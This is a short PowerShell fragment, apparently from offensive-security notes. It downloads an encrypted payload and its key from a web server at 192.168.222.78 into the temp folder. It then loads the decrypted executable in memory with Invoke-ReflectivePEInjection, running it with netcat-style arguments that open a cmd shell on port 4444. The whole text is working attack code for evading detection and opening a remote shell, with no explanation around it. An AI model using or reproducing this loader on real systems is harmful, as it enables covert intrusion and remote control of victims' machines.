...
(new-object Net.WebClient).DownloadFile('http://192.168.222.78:8000/ciphered.txt' , $env:temp+"/ciphertext")
$ciphertext = [System.IO.File]::ReadAllBytes($env:temp+"/ciphertext")

(new-object Net.WebClient).DownloadFile('http://192.168.222.78:8000/key.txt' , $env:temp+"/key")
...
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "-nlvp 4444 -e cmd"
